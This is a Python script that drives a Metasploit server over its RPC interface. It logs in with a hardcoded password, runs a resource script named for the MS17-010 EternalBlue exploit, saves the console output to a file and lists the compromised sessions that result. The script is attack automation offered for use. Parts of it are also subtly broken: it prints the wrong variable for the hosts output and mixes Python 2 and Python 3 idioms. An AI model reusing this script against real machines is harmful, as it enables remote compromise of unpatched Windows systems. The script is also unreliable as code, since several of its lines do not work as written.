import msfrpc
import sys
import time

if __name__ == '__main__':

    print('run the program!')

    # Create a new instance of the Msfrpc client with the default options
    client = msfrpc.Msfrpc({})

    # Login to the msf server using the password "asdf123"
    try:
        client.login(user='msf', password='asdf123')
        print('Login successfully!')
    except:
        print('Login failure!')
        sys.exit()

    #####################
    # Module
    # -------------------
    # list all auxiliary modules)
    #mod = client.call('module.payloads')
    # for i in (mod.get('modules')):
    #    print i

    # List all currently loaded plugins.
    #loaded_plugins = client.call('plugin.loaded')
    # for i in (loaded_plugins.get('plugins')):
    #    print i

    ######################
    # Console
    # --------------------
    # Create a new console instance
    try:
        msfcon = client.call('console.create')
        msfcon_id = msfcon['id']
        print('status of console create:', msfcon)
    except:
        print('console crete failure!')
        sys.exit()

    # Return a hash of all existing console IDs,their status,and their prompts
    # failure
    #msfcon_list = client.call(['console.list',])
    # print 'all console:',msfcon_list

    # print the begin page
    j = client.call('console.read', [msfcon_id, ])
    lines = j['data'].split('\n')
    for line in lines:
        print(line)

    # Print the hosts
    print('\n*****************************************')
    print('to get the host in db')
    client.call('console.write', [msfcon_id, 'hosts\n'])
    hosts_output = client.call('console.read', [msfcon_id])
    hosts_output_lines = hosts_output['data'].split('\n')
    for line in lines:
        print(line)

    print('\n******************************************')
    print('to run the resource script...')

    # Write command to console
    command = """resource /root/HJYwork/code/ms17_010_eternalblue.rc\n"""
    command_status = client.call('console.write', [msfcon_id, command])
    print('command_status:', command_status)
    time.sleep(2)

    # Read any output currently buffered by the console that has not
    # already been read.

    fileobj = open('record.txt', 'w')

    while True:
        msfcon_output = client.call('console.read', [msfcon_id])
        op = msfcon_output['data']

        fileobj.write(op)

        if len(op) > 1:
            for line in op.split('\n'):
                print(line)
                # insert the code to deal

                # -----------------------
        if msfcon_output['busy'] == True:
            time.sleep(15)
            continue

        break

    fileobj.close()

    #######################
    # Sessions
    # ----------------------
    # List all active sessions in the framework instance.
    active_sessions = client.call('session.list')

    for i in range(len(active_sessions)):
        for title, value in active_sessions.get(i).iteritems():
            print(title, value)

    # deletes a running console instance by console ID,
    # console should always be destroyed after the caller is finished
    # to prevent resource leaks on the server side
    status = client.call('console.destroy', [msfcon_id])
    print(status)
    print('stop program running!')
